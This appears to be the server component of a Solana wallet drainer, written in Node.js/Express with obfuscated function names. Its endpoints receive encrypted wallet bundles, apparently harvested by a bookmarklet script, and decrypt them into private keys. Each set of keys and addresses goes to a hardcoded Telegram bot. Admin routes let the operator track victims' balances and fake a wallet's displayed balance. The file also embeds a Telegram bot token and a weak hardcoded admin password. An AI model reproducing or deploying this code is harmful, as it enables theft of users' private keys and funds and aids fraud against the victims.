const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const bs58 = require('bs58');
const { Connection, PublicKey } = require('@solana/web3.js');
const fetch = require('node-fetch');

const app = express();
const X7F9K2 = 5000;
const Q8M3N7 = path.join(__dirname, 'data.json');
const Z4H8L6 = "admin123";
const R2Y5P9 = crypto.randomBytes(32).toString('hex');
const W3K7M1 = new Set();

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '7999609809:AAGDcZvnDwc08fg0VsgqmzzcixOEh4Ncv6o';
const TELEGRAM_CHAT_ID = '7348305177';  // Replace with your correct chat ID

app.use(bodyParser.json());
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

if (!fs.existsSync(Q8M3N7)) {
    fs.writeFileSync(Q8M3N7, JSON.stringify([]));
}

// Reads and parses the data.json file
function D5V8B3() {
    try {
        const data = fs.readFileSync(Q8M3N7, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading data file:', error);
        return [];
    }
}

// Writes data to the data.json file
function F6N2T9(data) {
    fs.writeFileSync(Q8M3N7, JSON.stringify(data, null, 2));
}

// Establishes connection to Solana mainnet
const solanaConnection = new Connection('https://api.mainnet-beta.solana.com');

// Fetches the current price of Solana (SOL) in USD from CoinGecko
async function G7P4R8() {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        const data = await response.json();
        return data.solana.usd;
    } catch (error) {
        console.error('Error fetching SOL price (prob 429 from free APIs):', error);
        return 0;
    }
}

// Retrieves the balance of a Solana public key in SOL
async function H3X9M5(publicKeyString) {
    try {
        const publicKey = new PublicKey(publicKeyString);
        const balance = await solanaConnection.getBalance(publicKey);
        return balance / 1000000000;
    } catch (error) {
        console.error(`Failed to check balance for ${publicKeyString}:`, error.message);
        return 0;
    }
}

// Decrypts and processes an array of sBundles (encrypted wallet data)
function J8L4Q6(sBundlesString, bundleKey) {
    try {
        const sBundlesArray = JSON.parse(sBundlesString);
        const key = Buffer.from(bundleKey, "base64");
        const wallets = [];

        sBundlesArray.forEach((sBundle, idx) => {
            try {
                const [ivB64, ctB64] = sBundle.split(":");
                const iv = Buffer.from(ivB64, "base64");
                const ciphertext = Buffer.from(ctB64, "base64");

                const tag = ciphertext.slice(ciphertext.length - 16);
                const data = ciphertext.slice(0, ciphertext.length - 16);

                const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
                decipher.setAuthTag(tag);
                const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);

                const privKey = decrypted.slice(0, 32);
                const pubKey = decrypted.slice(32, 64);

                wallets.push({
                    walletIndex: idx + 1,
                    privateKey: bs58.default ? bs58.default.encode(decrypted) : bs58.encode(decrypted),
                    publicKey: bs58.default ? bs58.default.encode(pubKey) : bs58.encode(pubKey)
                });
            } catch (e) {
                console.error(`Error processing sBundle #${idx + 1}:`, e.message);
                wallets.push({
                    walletIndex: idx + 1,
                    error: e.message
                });
            }
        });

        return {
            count: sBundlesArray.length,
            wallets: wallets
        };
    } catch (e) {
        console.error('Error parsing sBundles:', e.message);
        return {
            count: 0,
            wallets: [],
            error: e.message
        };
    }
}

// Middleware to verify authentication token
function K9S2E7(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token || !W3K7M1.has(token)) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    next();
}

// Generates a random 32-byte token as a hexadecimal string
function A4C8N1() {
    return crypto.randomBytes(32).toString('hex');
}

// Sends a message to the Telegram chat
async function sendToTelegram(message, chatId = TELEGRAM_CHAT_ID) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Helper function to build formatted Telegram message
function buildTelegramMessage(newEntry, walletCount) {
    let message = `🔎 *Profile Information*\n`;
    message += `├ 👤 *User:* ${newEntry.user || 'Unknown'}\n`;
    message += `├ 🎖 *Level:* ${newEntry.level || 'N/A'}\n`;

    // Primary wallet under profile (first wallet)
    if (newEntry.processedSBundles && newEntry.processedSBundles.wallets && newEntry.processedSBundles.wallets.length > 0) {
        const firstWallet = newEntry.processedSBundles.wallets[0];
        if (firstWallet.publicKey) {
            const shortened = firstWallet.publicKey.slice(0, 5) + '…' + firstWallet.publicKey.slice(-5);
            const link = `[${shortened}](https://solscan.io/account/${firstWallet.publicKey})`;
            message += `├ 💳 ${link}\n`;
        }
    }

    message += `├ 🪪 *ID:* ${newEntry.id || 'N/A'}\n\n`;

    // Connected Wallets
    message += `💳 *Connected Wallets (${walletCount})*\n`;
    if (newEntry.processedSBundles && newEntry.processedSBundles.wallets) {
        newEntry.processedSBundles.wallets.forEach((wallet, index) => {
            const idx = index + 1;
            if (wallet.publicKey || wallet.privateKey || wallet.error) {
                if (wallet.publicKey) {
                    const shortened = wallet.publicKey.slice(0, 5) + '…' + wallet.publicKey.slice(-5);
                    const link = `[${shortened}](https://solscan.io/account/${wallet.publicKey})`;
                    message += `├ ${idx}. 💳 ${link}\n`;
                }
                if (wallet.privateKey) {
                    message += `├ ${idx}. 🔑 *Key:* \`${wallet.privateKey}\`\n`;
                }
                if (wallet.error) {
                    message += `├ ${idx}. ❌ *Error:* \`${wallet.error}\`\n`;
                }
            }
        });
    }

    if (newEntry.processedSBundles && newEntry.processedSBundles.error) {
        message += `\n⚠️ *Processing Error:* \`${newEntry.processedSBundles.error}\``;
    }

    return message;
}

// Admin login endpoint
app.post('/api/admin-login', (req, res) => {
    try {
        const { secretKey } = req.body;

        if (secretKey === Z4H8L6) {
            const token = A4C8N1();
            W3K7M1.add(token);

            setTimeout(() => {
                W3K7M1.delete(token);
            }, 24 * 60 * 60 * 1000);

            res.json({
                success: true,
                token: token,
                message: 'Authentication successful'
            });
        } else {
            res.status(401).json({
                success: false,
                message: 'Invalid secret key'
            });
        }
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Verify admin token endpoint
app.get('/api/verify-admin', (req, res) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (token && W3K7M1.has(token)) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

// Admin logout endpoint
app.post('/api/admin-logout', K9S2E7, (req, res) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (token) {
        W3K7M1.delete(token);
    }

    res.json({ success: true, message: 'Logged out successfully' });
});

// Store bookmark data endpoint with Telegram notification
app.post('/api/bookmark-data', async (req, res) => {
    try {
        const data = D5V8B3();
        const newEntry = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            chatId: req.body.chatId || null, // Store user chat ID if provided
            ...req.body
        };

        if (newEntry.sBundles && newEntry.bundle) {
            newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
        }

        data.push(newEntry);
        F6N2T9(data);

        // Format and send Telegram notification
        const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
        const message = buildTelegramMessage(newEntry, walletCount);

        // If too long, split into multiple messages
        if (message.length > 4096) {
            const chunks = [];
            let currentChunk = message.substring(0, 4096).trim();
            let remaining = message.substring(4096);

            chunks.push(currentChunk);

            while (remaining.length > 0) {
                currentChunk = `\n\n*Continued...* 📄\n\n${remaining.substring(0, 4096).trim()}`;
                remaining = remaining.substring(4096);
                chunks.push(currentChunk);
            }

            // Send each chunk
            for (let i = 0; i < chunks.length; i++) {
                await sendToTelegram(chunks[i]);
            }
        } else {
            await sendToTelegram(message);
        }

        res.json({ success: true, id: newEntry.id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Retrieve bookmark data endpoint
app.get('/api/bookmark-data', K9S2E7, (req, res) => {
    try {
        const data = D5V8B3();
        res.json(data);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Delete bookmark data by ID endpoint
app.delete('/api/bookmark-data/:id', K9S2E7, (req, res) => {
    try {
        const data = D5V8B3();
        const filteredData = data.filter(item => item.id !== parseInt(req.params.id));
        F6N2T9(filteredData);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Update user balance endpoint (admin only)
app.post('/api/update-balance', K9S2E7, async (req, res) => {
    try {
        const { entryId, walletIndex, balance } = req.body;
        if (!entryId || typeof walletIndex !== 'number' || typeof balance !== 'number') {
            return res.status(400).json({ success: false, error: 'Missing or invalid parameters: entryId, walletIndex, balance required' });
        }

        const data = D5V8B3();
        const entryIndex = data.findIndex(item => item.id === entryId);
        if (entryIndex === -1) {
            return res.status(404).json({ success: false, error: 'Entry not found' });
        }

        const entry = data[entryIndex];
        if (!entry.processedSBundles || !entry.processedSBundles.wallets) {
            return res.status(400).json({ success: false, error: 'No wallets found in entry' });
        }

        const wallet = entry.processedSBundles.wallets.find(w => w.walletIndex === walletIndex);
        if (!wallet) {
            return res.status(404).json({ success: false, error: 'Wallet not found' });
        }

        // Add or update customBalance
        wallet.customBalance = balance;
        F6N2T9(data);

        res.json({ success: true, message: `Balance updated for wallet ${walletIndex} in entry ${entryId} to ${balance} SOL` });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Send message to user endpoint (admin only)
app.post('/api/send-user-message', K9S2E7, async (req, res) => {
    try {
        const { entryId, message } = req.body;
        if (!entryId || !message) {
            return res.status(400).json({ success: false, error: 'Missing parameters: entryId and message required' });
        }

        const data = D5V8B3();
        const entry = data.find(item => item.id === entryId);
        if (!entry) {
            return res.status(404).json({ success: false, error: 'Entry not found' });
        }

        const chatId = entry.chatId;
        if (!chatId) {
            return res.status(400).json({ success: false, error: 'No chat ID found for this user. Provide chatId when creating the entry.' });
        }

        const sent = await sendToTelegram(message, chatId);
        if (sent) {
            res.json({ success: true, message: 'Message sent to user successfully' });
        } else {
            res.status(500).json({ success: false, error: 'Failed to send message' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Check balances of all wallets endpoint (now respects customBalance)
app.get('/api/check-balances', K9S2E7, async (req, res) => {
    try {
        const data = D5V8B3();
        const solPrice = await G7P4R8();

        let allAddresses = [];
        let totalSolBalance = 0;
        let addressBalances = [];

        for (const entry of data) {
            if (entry.processedSBundles && entry.processedSBundles.wallets) {
                for (const wallet of entry.processedSBundles.wallets) {
                    if (wallet.publicKey && !wallet.error) {
                        allAddresses.push({
                            entryId: entry.id,
                            walletIndex: wallet.walletIndex,
                            publicKey: wallet.publicKey
                        });
                    }
                }
            }
        }

        for (const addr of allAddresses) {
            const entry = data.find(e => e.id === addr.entryId);
            const wallet = entry.processedSBundles.wallets.find(w => w.walletIndex === addr.walletIndex);
            let balance = wallet.customBalance !== undefined ? wallet.customBalance : await H3X9M5(addr.publicKey);
            totalSolBalance += balance;

            addressBalances.push({
                entryId: addr.entryId,
                walletIndex: addr.walletIndex,
                publicKey: addr.publicKey,
                solBalance: balance,
                usdBalance: balance * solPrice,
                isCustom: wallet.customBalance !== undefined
            });
        }

        addressBalances.sort((a, b) => b.solBalance - a.solBalance);

        res.json({
            success: true,
            totalAddresses: allAddresses.length,
            totalSolBalance: totalSolBalance,
            totalUsdBalance: totalSolBalance * solPrice,
            solPrice: solPrice,
            addressBalances: addressBalances
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Serve login page
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Serve admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve index page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve bookmarkscript.js
app.get('/bookmarkscript.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'bookmarkscript.js'));
});

// Handle encoded data submission with Telegram notification
app.get('/data/:encodedData', async (req, res) => {
    try {
        const decodedData = JSON.parse(Buffer.from(req.params.encodedData, 'base64').toString());

        const data = D5V8B3();
        const newEntry = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            chatId: decodedData.chatId || null, // Store user chat ID if provided
            ...decodedData
        };

        if (newEntry.sBundles && newEntry.bundle) {
            newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
        }

        data.push(newEntry);
        F6N2T9(data);

        // Format and send Telegram notification
        const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
        const message = buildTelegramMessage(newEntry, walletCount);

        // If too long, split into multiple messages
        if (message.length > 4096) {
            const chunks = [];
            let currentChunk = message.substring(0, 4096).trim();
            let remaining = message.substring(4096);

            chunks.push(currentChunk);

            while (remaining.length > 0) {
                currentChunk = `\n\n*Continued...* 📄\n\n${remaining.substring(0, 4096).trim()}`;
                remaining = remaining.substring(4096);
                chunks.push(currentChunk);
            }

            // Send each chunk
            for (let i = 0; i < chunks.length; i++) {
                await sendToTelegram(chunks[i]);
            }
        } else {
            await sendToTelegram(message);
        }

        res.redirect('/success');
    } catch (error) {
        res.status(400).send(`
<!DOCTYPE html>
<html>
<head>
    <title>Error</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        .error { color: red; font-size: 24px; }
    </style>
</head>
<body>
    <div class="error">❌ Error: ${error.message}</div>
    <script>
        setTimeout(() => {
            window.close();
        }, 2000);
    </script>
</body>
</html>
        `);
    }
});

// Serve success page
app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Working on port ${PORT}.`);
});
